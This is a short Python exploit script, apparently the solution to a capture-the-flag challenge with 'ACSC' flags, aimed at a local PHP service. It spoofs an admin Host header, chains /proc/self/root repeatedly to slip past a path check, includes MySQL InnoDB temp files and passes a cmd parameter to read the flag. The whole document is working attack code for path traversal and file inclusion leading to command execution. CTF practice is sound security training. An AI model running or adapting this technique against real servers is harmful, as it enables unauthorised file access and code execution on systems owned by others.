import requests

HOST = "http://localhost:9000"

headers = {"Host":"admin.pepe"}

for i in range(1, 11):
    conn = requests.post(HOST+f"/index.php?normal=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/level_checker&admin=/var/lib/mysql/%23innodb_temp/temp_{i}.ibt&cmd=/flag", 
        headers=headers,
        data={"normal":"bypass lol"}
    )
    if 'ACSC' in conn.text:
        resp = conn.text
        flag = resp[resp.index("ACSC"):]
        flag = flag[:flag.index("}")+1]
        break
print(flag)
